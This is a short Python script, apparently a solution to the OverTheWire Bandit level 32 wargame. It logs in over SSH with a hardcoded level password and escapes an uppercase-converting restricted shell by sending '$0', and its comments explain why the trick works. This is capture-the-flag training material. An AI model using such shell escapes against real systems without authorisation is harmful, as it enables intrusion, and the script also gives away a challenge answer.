import os
import sys
sys.path.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')

import paramiko
import utils
import time

USERNAME = 'bandit32'
PASSWORD = '56a9bf19c63d650ce78e6ec0354ee45e'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print('connecting...\n')
client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)
remote= client.invoke_shell()

output = remote.recv(65535)
print(output.decode())

remote.send('ls')
remote.send('\n')
time.sleep(1)
output = remote.recv(65535)
print(output.decode())
"""
>> ls
sh: 1: LS: not found
"""
# from above, we can see that whatever command that we passed into it
# will be changed into an uppercase version of the command
# and then passed to sh to be executed
# sh LS
# thus, it return an error as sh can't find the command

# sh is the one executing the command here, therefore, $0 = sh
# $1 is LS

# reference: https://unix.stackexchange.com/questions/280454/what-is-the-meaning-of-0-in-the-bash-shell
# therefore, we will be able to get access to sh by using the command $0

remote.send('$0')
remote.send('\n')
time.sleep(1)
output = remote.recv(65535)
print(output.decode())

client.close()